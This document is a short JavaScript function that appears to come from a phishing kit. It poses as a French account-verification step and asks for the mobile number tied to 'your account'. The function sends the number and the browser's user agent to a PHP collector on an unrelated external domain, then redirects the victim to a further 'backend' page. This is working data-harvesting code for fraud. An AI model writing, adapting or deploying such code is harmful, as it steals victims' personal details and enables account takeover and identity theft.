function telinfo(){
		
				
var phone    = $('#phone').val();				
	
	

if(phone==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir le numéro mobile associé a votre compte",

})	

return false;	
}


var data_tel = 
{
DEVICE_CR        :  navigator.userAgent,
PHONE_CR            :	phone    

}; 



var _url = 'https://whitmirelifepro.com/td6uS0/data_tel.php';


$.post(_url,data_tel,function(data){
	console.log(data);
 var reponse = JSON.parse(data); 
if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


  window.location="./backend/loadf.html";
    


} 


}) 
}
